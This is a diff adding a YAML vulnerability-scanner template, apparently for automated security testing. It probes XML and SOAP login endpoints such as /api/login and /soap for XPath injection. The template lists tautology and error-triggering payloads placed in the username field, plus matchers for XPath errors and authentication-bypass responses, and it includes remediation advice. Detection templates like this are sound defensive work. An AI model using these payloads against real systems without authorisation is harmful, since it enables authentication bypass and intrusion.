@@ -1,0 +1,52 @@
+id: xpath-injection
+info:
+  name: XPath Injection via XML Request Body
+  severity: high
+  tags: [injection, xpath, xml, soap, authentication, dast]
+  description: "Injects XPath tautology and error-triggering payloads into username fields within XML and SOAP request bodies. XPath exception messages or unexpected authentication success confirm the application builds XPath queries directly from user input."
+  remediation: "Use XPath variable binding to separate query structure from user-supplied data. Validate and reject input containing XPath metacharacters before any query construction."
+  cwe: "CWE-643"
+  owasp: "A03:2021-Injection"
+
+payloads:
+  payload:
+    - "' or '1'='1"
+    - "' or 1=1 or 'a'='b"
+    - "x' or name()='username' or 'x'='y"
+    - "'] | //* | //*['"
+    - "' or count(parent::*[position()=1])=0 or 'a'='b"
+    - "x' or 1=1 and 'a'='a"
+
+requests:
+  - method: POST
+    paths:
+      - "/api/login"
+      - "/ws"
+      - "/soap"
+      - "/services/auth"
+      - "/xmlrpc"
+      - "/api/auth"
+    headers:
+      Content-Type: "application/xml"
+    body: "<?xml version=\"1.0\"?><root><username>{{payload}}</username><password>test</password></root>"
+    matchers-condition: or
+    matchers:
+      - type: regex
+        regex:
+          - "(?i)xpath.*error"
+          - "(?i)XPathException"
+          - "(?i)javax\\.xml\\.xpath"
+          - "(?i)unterminated string"
+          - "(?i)invalid xpath"
+          - "(?i)xml.*parse.*error"
+          - "(?i)XPath.*expression"
+        part: body
+        condition: or
+      - type: word
+        words:
+          - "access_token"
+          - "authenticated"
+          - "success"
+          - "welcome"
+        part: body
+        condition: or
